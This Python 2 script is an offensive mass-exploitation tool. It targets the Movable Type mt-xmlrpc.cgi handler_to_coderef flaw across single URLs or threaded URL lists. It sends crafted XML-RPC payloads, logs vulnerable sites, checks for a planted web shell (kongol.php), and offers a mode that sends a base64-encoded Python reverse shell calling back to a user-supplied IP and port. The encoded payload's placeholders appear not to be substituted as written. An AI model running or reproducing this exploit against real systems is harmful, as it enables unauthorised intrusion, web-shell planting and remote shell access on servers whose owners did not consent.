# -*- coding: utf-8 -*
#!/usr/bin/python
#My Friendo : JametKNTLS -  h0d3_g4n - Moslem And All Coders
# Blog : https://www.blog-gan.org          
#DONATE ME :(
    # BTC = 31mtLHqhaXXyCMnT2EU73U8fwYwigiEEU1
    # PERFECT MONEY  = U22270614
################Command#####################
import requests, re, urllib2, os, sys, codecs, random                
from multiprocessing.dummy import Pool                         
from time import time as timer    
import time
import socket
import json                       
from platform import system    
from random import sample
from colorama import Fore                                
from colorama import Style                                
from pprint import pprint                                
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
############Color###############
abang = '\033[31m'
ijo = '\033[32m'
kuning = '\033[33m'
birtu = '\033[34m'
ungu = '\033[35m'
biru = '\033[36m'
abu = '\033[37m'
putih = '\033[0m' 
year = time.strftime("%y")
month = time.strftime("%m")
############Shell Backdoor###############
############Logo###############

def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
          \033[31m\   \033[31m/
   \033[34m----- (9\033[31m"-_-\033[34m)9  \033[37mVs  \033[34m6(\033[31mx_x"\033[34m6) -----
   
   \033[32m>--------------------------------<
 Prv8 Bot - Pwrd Ajibarang1337
   
   
   \033[41m\033[1;33m[Blog : https://www.blog-gan.org\033[0m
   \033[41m\033[1;33m[ICQ : https://icq.im/Shin403\033[0m
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()

def menu():
    print("\n\033[91mPilih Mode:\033[97m")
    print("\033[91m1. Single URL\033[97m")
    print("\033[91m2. File List\033[97m")
    print("\033[91m3. Single URL with Reverse Shell\033[97m")
    choice = raw_input("\033[91mPilih (1/2/3):\033[97m ")
    return choice

choice = menu()

if choice == '1':
    url = raw_input("\n\033[91mMasukkan URL:\033[97m ")
    ooo = [url]
    crownes = 2  # Thread diatur menjadi 2 untuk Single URL
elif choice == '2':
    start_raw = raw_input("\n\033[91mGive,Me List Dear\033[97m:~# \033[97m")
    crownes = raw_input("\033[91mthread \033[97m\033[97m:~# \033[97m")
    try:
        with open(start_raw, 'r') as f:
            ooo = f.read().splitlines()
    except IOError:
        print '\033[31mFile tidak ditemukan!'
        sys.exit()
elif choice == '3':
    url = raw_input("\n\033[91mMasukkan URL:\033[97m ")
    ooo = [url]
    crownes = 2  # Thread diatur menjadi 2 untuk Single URL
    reverse_ip = raw_input("\n\033[91mMasukkan IP untuk Reverse Shell:\033[97m ")
    reverse_port = raw_input("\n\033[91mMasukkan Port untuk Reverse Shell:\033[97m ")
else:
    print '\033[31mPilihan tidak valid!'
    sys.exit()

try:
    ooo = list(dict.fromkeys(ooo))
except NameError:
    print '\033[31mOpen Your Eyes!'
    sys.exit()
if choice == '2':
    count = 0
    with open(start_raw, 'r') as f:
        for line in f:
            count += 1
    print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92mTOTAL WEBLIST=', count
else:
    print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92mTOTAL WEBLIST= 1'  # Single URL hanya memiliki 1 URL

############Mulai :v###############

def generate_reverse_shell(ip, port):
    return """<?xml version="1.0"?>
    <methodCall>
    <methodName>mt.handler_to_coderef</methodName>
    <params>
    <param><value><base64>
    YHB5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHsKcG9ydH0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOydg
    </base64></value></param>
    </params>
    </methodCall>""".format(ip=ip, port=port)

def jancok(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36'}
        if choice == '3':
            data = generate_reverse_shell(reverse_ip, reverse_port)
        else:
            data = """<?xml version="1.0"?>
            <methodCall>
            <methodName>mt.handler_to_coderef</methodName>
            <params>
            <param><value><base64>
        
        </base64></value></param>
            </params>
            </methodCall>"""
        cok = requests.post(url + '/mt-xmlrpc.cgi', headers=headers, data=data, timeout=10, verify=False)
        if "MT::handler_to_coderef('mt', '`echo" in cok.content or "MT::handler_to_coderef('mt', '`echo" in cok.text:
            print(kuning + '[+]' + url + ijo + '>' + ' Vuln')
            open('vulnmt.txt', 'a').write(url + "/mt-xmlrpc.cgi\n")
            pekok = requests.get(url + '/kongol.php', headers=headers, timeout=10, verify=False)
            if 'Money Manager' in pekok.content or 'Money Manager' in pekok.text:
                print(kuning + '[+]' + url + ijo + '>' + ' Success Uploaded ')
                open('shellmt.txt', 'a').write(url + "/kongol.php\n")
            else:
                print(kuning + '[+]' + url + abang + '>' + ' Failed Uploaded')
        else:
            print(kuning + '[+]' + url + abang + '>' + ' Not Vuln')

    except:
        pass
    pass
            
            
############Penutup :v###############

def Main():
    try:
        start = timer()
        pp = Pool(int(crownes))
        pp = pp.map(jancok, ooo)
        print('TIME TAKE: ' + str(timer() - start) + ' S')
    except:
        pass


if __name__ == '__main__':
    Main()